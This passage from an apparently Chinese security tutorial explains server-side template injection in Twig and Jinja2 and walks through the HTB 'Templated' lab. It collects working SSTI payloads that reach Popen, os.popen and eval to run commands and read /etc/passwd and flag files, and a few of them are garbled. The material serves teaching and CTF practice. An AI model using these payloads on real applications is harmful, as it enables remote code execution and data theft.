    <span class="hljs-comment">// 将用户输入作为模版变量的值</span>

　　<span class="hljs-keyword">echo</span> <span class="hljs-variable">$output</span>;
<span class="hljs-meta">?&gt;</span></code></pre>
<p>这段代码中，由于<strong>模板引擎一般都会默认对渲染的变量值进行编码和转义</strong>。所以一般情况下并不会存在XSS等攻击的可能</p>
<p>若就如我们最开始的例子所说，<strong>若模板引擎渲染的内容受我们控制了</strong>，就不一定了</p>
<pre><code class="hljs plaintext">// 上述代码基本内容不变，$output后的内容发生变化
　$output=$twig-&gt;render("Hello {$_GET['name']}");// 将用户输入作为模版内容的一部分</code></pre>
<p>此时render函数由于缺少第二个参数，所以<strong>直接就会把<code>"Hello 用户的输入"</code>拼如模板进行渲染</strong>,这就相当于改变了最初的模板，由于模板最初是由开发者定义的，所以他会受到“信任”</p>
<pre><code class="hljs plaintext">对于Twig模板的变量`{{%s}}`除了传递变量外，还可以执行表达式，最简单的表达式就是{{2*2}}，这也是辨认是否存在SSTI最基本的指纹，若我们输入{{2*2}}，HTML页面返回其其结果4，就说明该表达式被解析，存在SSTI</code></pre>
<h4 id="3-靶场实战">3. 靶场实战</h4>
<p>HTB-Templated</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230622165242901.png" alt="image-20230622165242901"></p>
<pre><code class="hljs plaintext">题目直接提示我们本体使用的模板引擎为**Jinja2**，根据我们之前总结的各个模板引擎的变量类型，我们可以知道该变量的类型是 **{{%s}}**，所以话不多说我们直接拼接尝试</code></pre>
<pre><code class="hljs plaintext">payload={{2 * 2}}</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230622165431523.png" alt="image-20230622165431523"></p>
<p><strong>2*2被计算，确认存在SSTI模板注入</strong></p>
<p><strong>exp</strong></p>
<p>本题的重点还是在利用方面：由于我们的目标是读取处于服务器本地的一个存有Flag的文件，所以我们的重点是找到一个含有某种读取文件的函数的类（Python中），我们通过查阅手册发现可以利用<code>Popen</code>函数完成该功能，调用该函数会返回一个文件的句柄，然后再配合read()函数读取即可</p>
<p>该函数会执行<code>fork</code>一个子进程执行<code>command</code>这个命令，同时将子进程的标准输出通过管道连接到父进程，对于文件在父进程调用read()读取即可，对于命令在父进程会被执行</p>
<p>那么下面的重点就是，如何找到<code>Popen</code>这个函数所属的类，一般有两种方法，我们先说第一种</p>
<p>由于我们想要找的是一个子类，所以第一步即使找到其对象基类 即<code>class 'object'</code>，为了达到这步，我们可以使用<code>__mro__</code>属性来访问对象的继承类，但我们目前没有对象，所以这里我们就构造一个<strong>空字符串</strong>:</p>
<pre><code class="hljs plaintext">`{{"".__class__.__mro__}}`其中`__class__`用于返回调用的参数类型</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230622165651398.png" alt="image-20230622165651398"></p>
<p>可以看出该子类继承自<code>class'str'</code>与<code>class 'object'</code>并以一个元组返回，我们通过索引获得对象类</p>
<pre><code class="hljs plaintext">{{"".__class__.__mro__[1]}}</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230622165720077.png" alt="image-20230622165720077"></p>
<p>接下来，我们要列举出所有集成自object的子类，通过对该对象调用<code>__subclasses__</code>方法</p>
<pre><code class="hljs plaintext">{{"".__class__.__mro__[1].__subclasses__()}}</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230622165759911.png" alt="image-20230622165759911"></p>
<p>但这有一个明显的缺点就是，好家伙，这么多子类，怎么可能找得到，<strong>为了缩小范围我们对其进行切片</strong></p>
<pre><code class="hljs plaintext">`{{"".__class__.__mro__[1].__subclasses__()[400:]}}`查找400个以后的元素</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230622165935917.png" alt="image-20230622165935917"></p>
<p>成功定位其位置，处于滴414号位置</p>
<pre><code class="hljs plaintext">{{"".__class__.__mro__[1].__subclasses__()[414]}}</code></pre>
<p>然后我们为该函数传递参数调用即可</p>
<pre><code class="hljs plaintext">{{"".__class__.__mro__[1].__subclasses__()[414]("ls",shell=True,stdout=-1).communicate()}}</code></pre>
<p>查看本地文件，发现<code>flag.txt</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230622170048071.png" alt="image-20230622170048071"></p>
<pre><code class="hljs plaintext">Popen.communicate()
与进程交互：将数据发送到标准输入。从 stdout 和 stderr 读取数据，直到到达文件结尾</code></pre>
<p>之后我们直接<code>cat</code>他就看见啦~~~~</p>
<pre><code class="hljs plaintext">{{"".__class__.__mro__[1].__subclasses__()[414]("cat flag.txt",shell=True,stdout=-1).communicate()}}</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230622170109873.png" alt="image-20230622170109873"></p>
<p>剩下的未实操过</p>
<p><strong>exp2</strong></p>
<p>这里我们还有一种方法，使用全局下的内置模块引用<code>__builtins__</code>（指向<code>__builtin__</code>）</p>
<p>在Python中，有一个内建模块，该模块中有一些常用函数;而该模块在Python启动后、且没有执行程序员所写的任何代码前，Python会首先加载 该内建函数到内存</p>
<pre><code class="hljs plaintext">{{"".__class__.__bases__[0].__subclasses__()[1500].__init__.__globals__['__builtins__']['__import__']("os").popen("cat flag.txt").read()}}</code></pre>
<p>同样，我们获取基本类后，继续向下获取基本类(object)的子类，然后<code>init</code>初始化类，<code>globals</code>全局来查找所有的方法及变量和参数并查看其内建模块的引用</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230622170431180.png" alt="image-20230622170431180"></p>
<p>使用内建模块中的<code>__import__</code>引入<code>os</code>库，并适用其中的<code>popen</code>函数读取<code>flag.txt</code>即可</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230622170442551.png" alt="image-20230622170442551"></p>
<p>注意：</p>
<p>该exp中，对子类的选择<code>subclasses()[1500]</code>时，经测试大多数子类中都包含内建模块的引用，但依旧有不少不包含，要注意</p>
<p>我们使用burp将子类的选择加为参数进行爆破</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230622170551908.png" alt="image-20230622170551908"></p>
<p>遍历出（以下截图中Payload的子类号都可以引用，具有**<code>__builtins__</code>**）</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230622170603589.png" alt="image-20230622170603589"></p>
<p>以下为不可以使用的（由此可看出号往大了写就对了~）</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230622170626554.png" alt="image-20230622170626554"></p>
<h4 id="4-ssti利用思路">4. SSTI利用思路</h4>
<p>先上Payload：</p>
<pre><code class="hljs python">{{<span class="hljs-string">''</span>.__class__.__base__.__subclasses__()[<span class="hljs-number">1</span>].__init__.__globals__[<span class="hljs-string">'__builtins__'</span>][<span class="hljs-string">'eval'</span>](<span class="hljs-string">'__import__("os").popen("ls").read()'</span>)}}</code></pre>
<p>下面分步对每一步代码进行分析：</p>
<p>1.首先考虑拿到一个class，通过字符串、元组、列表、字典均可。</p>
<pre><code class="hljs python">{{<span class="hljs-string">''</span>.__class__}}
<span class="hljs-comment"># &lt;class 'str'&gt;</span>
{{().__class__}}
<span class="hljs-comment"># &lt;type 'tuple'&gt;</span>
{{[].__class__}}
<span class="hljs-comment"># &lt;type 'list'&gt;</span>
{{{}.__class__}}
<span class="hljs-comment"># &lt;type 'dict'&gt;</span></code></pre>
<p>2.下一步目的是拿到object基类。</p>
<pre><code class="hljs python">{{<span class="hljs-string">''</span>.__class__.__base__}}
<span class="hljs-comment"># &lt;class 'object'&gt;</span></code></pre>
<p>3.然后获取对应子类。</p>
<pre><code class="hljs python">{{<span class="hljs-string">''</span>.__class__.__base__.__subclasses__()}}
<span class="hljs-comment"># [&lt;class 'type'&gt;, &lt;class 'weakref'&gt;, &lt;class 'weakcallableproxy'&gt;, &lt;class 'weakproxy'&gt;, &lt;class 'int'&gt;, ...</span></code></pre>
<p>4.在所有的子类中选择一个可用的类，去获取__globals__全局变量。如果这些函数并没有被重载，这时他们并不是function，不具有__globals__属性。</p>
<pre><code class="hljs python">{{<span class="hljs-string">''</span>.__class__.__base__.__subclasses__()[<span class="hljs-number">128</span>]}}
<span class="hljs-comment"># &lt;class 'os._wrap_close'&gt;</span></code></pre>
<p>5.通过某些手段找到某个函数是可用的，下一步利用这个类的__init__函数获取到__globals__全局变量。</p>
<pre><code class="hljs python">{{<span class="hljs-string">''</span>.__class__.__base__.__subclasses__()[<span class="hljs-number">128</span>].__init__}}
<span class="hljs-comment"># &lt;function _wrap_close.__init__ at 0x00000221629F5048&gt;</span>

{{<span class="hljs-string">''</span>.__class__.__base__.__subclasses__()[<span class="hljs-number">128</span>].__init__.__globals__}}
<span class="hljs-comment"># ..., 'eval': &lt;built-in function eval&gt;, ...</span></code></pre>
<p>6.再获取到__globals__全局变量里的__builtins__中的eval函数。</p>
<pre><code class="hljs python">{{<span class="hljs-string">''</span>.__class__.__base__.__subclasses__()[<span class="hljs-number">128</span>].__init__.__globals__[<span class="hljs-string">'__builtins__'</span>]}}
<span class="hljs-comment"># {'__name__': 'builtins', '__doc__': ...</span>

{{<span class="hljs-string">''</span>.__class__.__base__.__subclasses__()[<span class="hljs-number">128</span>].__init__.__globals__[<span class="hljs-string">'__builtins__'</span>][<span class="hljs-string">'eval'</span>]}}
<span class="hljs-comment"># &lt;built-in function eval&gt;</span></code></pre>
<p>7.使用popen命令执行即可。</p>
<pre><code class="hljs python">{{<span class="hljs-string">''</span>.__class__.__base__.__subclasses__()[<span class="hljs-number">128</span>].__init__.__globals__[<span class="hljs-string">'__builtins__'</span>][<span class="hljs-string">'eval'</span>](<span class="hljs-string">'__import__("os").popen("whoami").read()'</span>)}}
<span class="hljs-comment"># root</span></code></pre>
<h3 id="23-常用类">2.3 常用类</h3>
<p>先举几个基础的例子方便理解：<br>
<strong>1、class</strong></p>
<p>__class__用来查看变量所属的类，格式为变量.<strong>class</strong></p>
<pre><code>&gt;&gt;&gt; ''.__class__
&lt;class 'str'&gt;
&gt;&gt;&gt; ().__class__
&lt;class 'tuple'&gt;
&gt;&gt;&gt; {}.__class__
&lt;class 'dict'&gt;
&gt;&gt;&gt; [].__class__
&lt;class 'list'&gt;
</code></pre>
<p><strong>2、bases</strong></p>
<p>__bases__用来查看类的基类，注意是类的基类，所以格式为变量.<strong>class</strong>.<strong>bases</strong></p>
<pre><code>&gt;&gt;&gt; ''.__class__.__bases__
(&lt;class 'object'&gt;,)
&gt;&gt;&gt; ().__class__.__bases__
(&lt;class 'object'&gt;,)
&gt;&gt;&gt; {}.__class__.__bases__
(&lt;class 'object'&gt;,)
&gt;&gt;&gt; [].__class__.__bases__
(&lt;class 'object'&gt;,)
</code></pre>
<p>同时也能加上数组，比如变量.<strong>class</strong>.<strong>bases</strong>[0]来获得第一个基类。</p>
<p>值得一提的是还有个类是__mro__，它会显示类和基类，这是它和__bases__的不同。</p>
<pre><code>&gt;&gt;&gt; ''.__class__.__mro__
(&lt;class 'str'&gt;, &lt;class 'object'&gt;)
</code></pre>
<p><strong>3、subclasses()</strong></p>
<p><strong>subclasses</strong>()查看当前类的子类，格式变量.<strong>class</strong>.<strong>bases</strong>[0].<strong>subclasses</strong>()<br>
这个类也可以加数组来查看指定的索引值，例如变量.<strong>class</strong>.<strong>bases</strong>[0].<strong>subclasses</strong>()[1]</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230318123240953.png" alt="image-20230318123240953"></p>
<pre><code class="hljs plaintext">&gt;&gt;&gt; ''.__class__.__bases__[0].__subclasses__()[0]
&lt;class 'type'&gt;</code></pre>
<p>这个时候就可以开始利用类里面的方法了。</p>
<p>例如:</p>
<pre><code class="hljs plaintext">变量.__class__.__bases__[0].__subclasses__()[138].__init__.__globals__</code></pre>
<p>init初始化类，然后globals全局来查找所有的方法及变量及参数。</p>
<p>由此我们可以看到各种各样的参数方法函数，去找一个可利用的function来执行，比如popen的话，就可以这样利用：</p>
<pre><code class="hljs plaintext">''.__class__.__bases__[0].__subclasses__()[138].__init__.__globals__['popen']('dir').read()</code></pre>
<p>大概是这么个原理，但这样说来还是不知道怎么利用，来看几道题就能更深刻理解了。</p>
<p>之后的题目参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/Manuffer/article/details/120739989?spm=1001.2014.3001.5506">https://blog.csdn.net/Manuffer/article/details/120739989?spm=1001.2014.3001.5506</a></p>
<h4 id="魔术对象">魔术对象</h4>
<pre><code class="hljs plaintext">__class__  :返回类型所属的对象
__mro__    :返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。
__base__   "返回该对象所继承的基类
// __base__和__mro__都是用来寻找基类的

__subclasses__  获取当前类的所有子类
__init__  类的初始化方法
__globals__  对包含(保存)函数全局变量的字典的引用</code></pre>
<h4 id="用魔术对象构造一个简单的语句">用魔术对象构造一个简单的语句</h4>
<p>我们在里面运行以下：</p>
<pre><code class="hljs plaintext">&gt;&gt;&gt; [].__class__
&lt;class 'list'&gt;
&gt;&gt;&gt; [].__class__.__base__
&lt;class 'object'&gt;
&gt;&gt;&gt; [].__class__.__base__.__subclasses__()

&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[2]
&lt;class 'weakcallableproxy'&gt;
&gt;&gt;&gt;</code></pre>
<p>解读一下：<br>
class返回[]所属的对象；<br>
class+base:返回这个对象所继承的基类<br>
class+base+subclasses:找到了这个对象的基类，那么就返回这个基类下所具有的子类这就是一个具有[]的对象继承的基类的所有子类，在这里面我们不乏可以找到我们要用的子类如前文所提到的：file、open等等。<br>
那么既然我们要用SSTI去做些事情，那么我们就要用到这些子类呗。</p>
<p><strong>如何调用这些子类：</strong></p>
<pre><code class="hljs plaintext">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[2]
&lt;class 'weakcallableproxy'&gt;
&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[3]
&lt;class 'weakproxy'&gt;
&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[40]
&lt;class 'wrapper_descriptor'&gt;</code></pre>
<p>这样我们就可以调用这些子类了</p>
<p>假如我们要去查看某个网页获取flag，那么我们用file函数：(file 在PT2里面还可以使用，在PY3里面已经被移除了)</p>
<pre><code class="hljs plaintext">[].__class__.__base__.__subclasses__()[40]('fl4g').read()</code></pre>
<p>但是如果我们想要去获取目录等等，就需要用到system函数：读取目录一般是ls函数，那么我们来看看如何调用</p>
<pre><code class="hljs plaintext">!/usr/bin/env python
 encoding: utf-8

num = 0
for item in ''.__class__.__mro__[2].__subclasses__():
    try:
         if 'os' in item.__init__.__globals__:
             print num,item
         num+=1
    except:
        print '-'
        num+=1</code></pre>
<p>得到类中OS模块的函数(71)</p>
<pre><code class="hljs plaintext">().__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].system('ls')
(os.listdir()：列出第一层目录文件 
因为71是os库的函数，所以globals是对该函数字典的引用，所以我们这下就拿到了字典，然后紧接着就是我们要使用的命令。)</code></pre>
<p>有时候system函数会被过滤掉，我们就使用</p>
<pre><code class="hljs plaintext">().__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].listdir('.')  #读取本级目录</code></pre>
<h4 id="dir与__dict__">dir()与__dict__</h4>
<p>dir()是一个函数，返回的是list；<br>
__dict__是一个字典，键为属性名，值为属性值；<br>
dir()返回所有的属性，而__dict__返回的是非父类的键与对应的值。</p>
<h3 id="24-常见的playload">2.4 常见的playload</h3>
<pre><code class="hljs scss">获得基类
<span class="hljs-selector-id">#python2</span><span class="hljs-selector-class">.7</span>
''<span class="hljs-selector-class">.__class__</span><span class="hljs-selector-class">.__mro__</span><span class="hljs-selector-attr">[2]</span>
{}<span class="hljs-selector-class">.__class__</span><span class="hljs-selector-class">.__bases__</span><span class="hljs-selector-attr">[0]</span>
()<span class="hljs-selector-class">.__class__</span><span class="hljs-selector-class">.__bases__</span><span class="hljs-selector-attr">[0]</span>
<span class="hljs-selector-attr">[]</span><span class="hljs-selector-class">.__class__</span><span class="hljs-selector-class">.__bases__</span><span class="hljs-selector-attr">[0]</span>
request<span class="hljs-selector-class">.__class__</span><span class="hljs-selector-class">.__mro__</span><span class="hljs-selector-attr">[1]</span>

<span class="hljs-selector-id">#python3</span><span class="hljs-selector-class">.7</span>
''<span class="hljs-selector-class">.__</span>。。。class__<span class="hljs-selector-class">.__mro__</span><span class="hljs-selector-attr">[1]</span>
{}<span class="hljs-selector-class">.__class__</span><span class="hljs-selector-class">.__bases__</span><span class="hljs-selector-attr">[0]</span>
()<span class="hljs-selector-class">.__class__</span><span class="hljs-selector-class">.__bases__</span><span class="hljs-selector-attr">[0]</span>
<span class="hljs-selector-attr">[]</span><span class="hljs-selector-class">.__class__</span><span class="hljs-selector-class">.__bases__</span><span class="hljs-selector-attr">[0]</span>
request<span class="hljs-selector-class">.__class__</span><span class="hljs-selector-class">.__mro__</span><span class="hljs-selector-attr">[1]</span>

<span class="hljs-selector-id">#python</span> <span class="hljs-number">2.7</span>
#文件操作
#找到file类
<span class="hljs-selector-attr">[]</span><span class="hljs-selector-class">.__class__</span><span class="hljs-selector-class">.__bases__</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.__subclasses__</span>()<span class="hljs-selector-attr">[40]</span>
#读文件
<span class="hljs-selector-attr">[]</span><span class="hljs-selector-class">.__class__</span><span class="hljs-selector-class">.__bases__</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.__subclasses__</span>()<span class="hljs-selector-attr">[40]</span>('/etc/passwd')<span class="hljs-selector-class">.read</span>()
#写文件
<span class="hljs-selector-attr">[]</span><span class="hljs-selector-class">.__class__</span><span class="hljs-selector-class">.__bases__</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.__subclasses__</span>()<span class="hljs-selector-attr">[40]</span>('/tmp')<span class="hljs-selector-class">.write</span>('test')

#命令执行
<span class="hljs-selector-id">#os</span>执行
<span class="hljs-selector-attr">[]</span><span class="hljs-selector-class">.__class__</span><span class="hljs-selector-class">.__bases__</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.__subclasses__</span>()<span class="hljs-selector-attr">[59]</span><span class="hljs-selector-class">.__init__</span><span class="hljs-selector-class">.func_globals</span><span class="hljs-selector-class">.linecache</span>下有os类，可以直接执行命令：
<span class="hljs-selector-attr">[]</span><span class="hljs-selector-class">.__class__</span><span class="hljs-selector-class">.__bases__</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.__subclasses__</span>()<span class="hljs-selector-attr">[59]</span><span class="hljs-selector-class">.__init__</span><span class="hljs-selector-class">.func_globals</span><span class="hljs-selector-class">.linecache</span><span class="hljs-selector-class">.os</span><span class="hljs-selector-class">.popen</span>('id')<span class="hljs-selector-class">.read</span>()
<span class="hljs-selector-id">#eval</span>,impoer等全局函数
<span class="hljs-selector-attr">[]</span><span class="hljs-selector-class">.__class__</span><span class="hljs-selector-class">.__bases__</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.__subclasses__</span>()<span class="hljs-selector-attr">[59]</span><span class="hljs-selector-class">.__init__</span><span class="hljs-selector-class">.__globals__</span><span class="hljs-selector-class">.__builtins__</span>下有eval，__import__等的全局函数，可以利用此来执行命令：
<span class="hljs-selector-attr">[]</span><span class="hljs-selector-class">.__class__</span><span class="hljs-selector-class">.__bases__</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.__subclasses__</span>()<span class="hljs-selector-attr">[59]</span><span class="hljs-selector-class">.__init__</span><span class="hljs-selector-class">.__globals__</span><span class="hljs-selector-attr">[<span class="hljs-string">'__builtins__'</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">'eval'</span>]</span>("__import__('os')<span class="hljs-selector-class">.popen</span>('id')<span class="hljs-selector-class">.read</span>()")
<span class="hljs-selector-attr">[]</span><span class="hljs-selector-class">.__class__</span><span class="hljs-selector-class">.__bases__</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.__subclasses__</span>()<span class="hljs-selector-attr">[59]</span><span class="hljs-selector-class">.__init__</span><span class="hljs-selector-class">.__globals__</span><span class="hljs-selector-class">.__builtins__</span><span class="hljs-selector-class">.eval</span>("__import__('os')<span class="hljs-selector-class">.popen</span>('id')<span class="hljs-selector-class">.read</span>()")
<span class="hljs-selector-attr">[]</span><span class="hljs-selector-class">.__class__</span><span class="hljs-selector-class">.__bases__</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.__subclasses__</span>()<span class="hljs-selector-attr">[59]</span><span class="hljs-selector-class">.__init__</span><span class="hljs-selector-class">.__globals__</span><span class="hljs-selector-class">.__builtins__</span><span class="hljs-selector-class">.__import__</span>('os')<span class="hljs-selector-class">.popen</span>('id')<span class="hljs-selector-class">.read</span>()
<span class="hljs-selector-attr">[]</span><span class="hljs-selector-class">.__class__</span><span class="hljs-selector-class">.__bases__</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.__subclasses__</span>()<span class="hljs-selector-attr">[59]</span><span class="hljs-selector-class">.__init__</span><span class="hljs-selector-class">.__globals__</span><span class="hljs-selector-attr">[<span class="hljs-string">'__builtins__'</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">'__import__'</span>]</span>('os')<span class="hljs-selector-class">.popen</span>('id')<span class="hljs-selector-class">.read</span>()

<span class="hljs-selector-id">#python3</span><span class="hljs-selector-class">.7</span>
#命令执行
{% for c in <span class="hljs-selector-attr">[]</span><span class="hljs-selector-class">.__class__</span><span class="hljs-selector-class">.__base__</span><span class="hljs-selector-class">.__subclasses__</span>() %}{% if c<span class="hljs-selector-class">.__name__</span>=='catch_warnings' %}{{ c<span class="hljs-selector-class">.__init__</span><span class="hljs-selector-class">.__globals__</span><span class="hljs-selector-attr">[<span class="hljs-string">'__builtins__'</span>]</span><span class="hljs-selector-class">.eval</span>("__import__('os')<span class="hljs-selector-class">.popen</span>('id')<span class="hljs-selector-class">.read</span>()") }}{% endif %}{% endfor %}
#文件操作
{% for c in <span class="hljs-selector-attr">[]</span><span class="hljs-selector-class">.__class__</span><span class="hljs-selector-class">.__base__</span><span class="hljs-selector-class">.__subclasses__</span>() %}{% if c<span class="hljs-selector-class">.__name__</span>=='catch_warnings' %}{{ c<span class="hljs-selector-class">.__init__</span><span class="hljs-selector-class">.__globals__</span><span class="hljs-selector-attr">[<span class="hljs-string">'__builtins__'</span>]</span><span class="hljs-selector-class">.open</span>('filename', 'r')<span class="hljs-selector-class">.read</span>() }}{% endif %}{% endfor %}
<span class="hljs-selector-id">#windows</span>下的os命令
""<span class="hljs-selector-class">.__class__</span><span class="hljs-selector-class">.__bases__</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.__subclasses__</span>()<span class="hljs-selector-attr">[118]</span><span class="hljs-selector-class">.__init__</span><span class="hljs-selector-class">.__globals__</span><span class="hljs-selector-attr">[<span class="hljs-string">'popen'</span>]</span>('dir')<span class="hljs-selector-class">.read</span>()</code></pre>
<h3 id="25-常见的命令执行方式">2.5 常见的命令执行方式</h3>
<h4 id="ossystem">os.system()</h4>
<pre><code class="hljs scss">…init__globals<span class="hljs-selector-attr">[‘os’]</span><span class="hljs-selector-class">.system</span>(‘ls’)的输出是执行结果的返回值，而不是执行命令的输出，成功执行返回<span class="hljs-number">0</span>，失败返回-<span class="hljs-number">1</span>，因为输出结果不明显，所以我们也会用到下面这个命令：</code></pre>
<h4 id="ospopen">os.popen()</h4>
<pre><code class="hljs scss">用法：os<span class="hljs-selector-class">.popen</span>(command[,mode[,bufsize]])
eg:{{()<span class="hljs-selector-class">.class</span><span class="hljs-selector-class">.base</span><span class="hljs-selector-class">.subclass__</span>()<span class="hljs-selector-attr">[71]</span><span class="hljs-selector-class">.init</span><span class="hljs-selector-class">.globlas__</span><span class="hljs-selector-attr">[‘os’]</span><span class="hljs-selector-class">.popen</span>(‘ls’,‘r’)<span class="hljs-selector-class">.read</span>()}}
说明：mode – 模式权限可以是 ‘r’(默认) 或 ‘w’。
init<span class="hljs-selector-class">.globals__</span><span class="hljs-selector-attr">[‘os’]</span><span class="hljs-selector-class">.popen</span>(‘ls’,‘r’),<span class="hljs-built_in">read</span>()
popen方法通过<span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.read</span>()获取终端输出，而且popen需要关闭<span class="hljs-built_in">close</span>().当执行成功时，<span class="hljs-built_in">close</span>()不返回任何值，失败时，<span class="hljs-built_in">close</span>()返回系统返回值（失败返回<span class="hljs-number">1</span>）. 可见它获取返回值的方式和os<span class="hljs-selector-class">.system</span>不同。</code></pre>
<p><strong>缺点：Popen非常强大，支持多种参数和模式，通过其构造函数可以看到支持很多参数。但Popen函数存在缺陷在于，它是一个阻塞的方法，如果运行cmd命令时产生内容非常多，函数就容易阻塞。另一点，Popen方法也不会打印出cmd的执行信息</strong></p>
<h4 id="warningscatchwarning">warnings.catchwarning</h4>
<p>访问os模块还有从warnings.catchwarnings模块入手的，而这两个模块分别位于元组中的59，60号元素。__init__方法用于将对象实例化，在这个函数下我们可以通过funcglobals（或者__globals）看该模块下有哪些globals函数（注意返回的是字典），而linecache可用于读取任意一个文件的某一行，而这个函数引用了os模块。</p>
<p>于是还可以挖掘到类似payload（注意payload都不是直接套用的，不同环境请自行测试）</p>
<pre><code class="hljs scss"><span class="hljs-selector-attr">[]</span><span class="hljs-selector-class">.__class__</span><span class="hljs-selector-class">.__base__</span><span class="hljs-selector-class">.__subclasses__</span>()<span class="hljs-selector-attr">[59]</span><span class="hljs-selector-class">.__init__</span><span class="hljs-selector-class">.__globals__</span><span class="hljs-selector-attr">[<span class="hljs-string">'linecache'</span>]</span><span class="hljs-selector-class">.__dict__</span><span class="hljs-selector-attr">[<span class="hljs-string">'os'</span>]</span><span class="hljs-selector-class">.system</span>('ls')

<span class="hljs-selector-attr">[]</span><span class="hljs-selector-class">.__class__</span><span class="hljs-selector-class">.__base__</span><span class="hljs-selector-class">.__subclasses__</span>()<span class="hljs-selector-attr">[59]</span><span class="hljs-selector-class">.__init__</span><span class="hljs-selector-class">.func_globals</span><span class="hljs-selector-attr">[<span class="hljs-string">'linecache'</span>]</span><span class="hljs-selector-class">.__dict__</span><span class="hljs-selector-class">.values</span>()<span class="hljs-selector-attr">[12]</span><span class="hljs-selector-class">.system</span>('ls')</code></pre>
<h4 id="values">values</h4>
<p>作用：返回字典中的所有值。<br>
使用：</p>
<pre><code class="hljs plaintext">#!/usr/bin/python

dict = {'Name': 'Zara', 'Age': 7}

print "Value : %s" %  dict.values()

以上实例输出结果为：

Value : [7, 'Zara']</code></pre>
<h4 id="__builtins__内建函数">__builtins__内建函数</h4>
<p><strong>内建函数就是本身就有的，启动的时候python解释器就会自动解析，内建函数里面包括了许多我们需要的eval函数，可以执行命令,但是经常会被ban</strong></p>
<pre><code class="hljs plaintext">当我们启动一个python解释器时，即时没有创建任何变量或者函数，还是会有很多函数可以使用，我们称之为内建函数。

内建函数并不需要我们自己做定义，而是在启动python解释器的时候，就已经导入到内存中供我们使用，想要了解这里面的工作原理，我们可以从名称空间开始。

`__builtins__` 方法是做为默认初始模块出现的，可用于查看当前所有导入的内建函数。

__globals__：该方法会以字典的形式返回当前位置的所有全局变量，与 func_globals 等价。该属性是函数特有的属性，记录当前文件全局变量的值，如果某个文件调用了os、sys等库，但我们只能访问该文件某个函数或者某个对象，那么我们就可以利用globals属性访问全局的变量。该属性保存的是函数全局变量的字典引用。

__import__()：该方法用于动态加载类和函数 。如果一个模块经常变化就可以使用 __import__() 来动态载入，就是 import。语法：__import__(模块名)

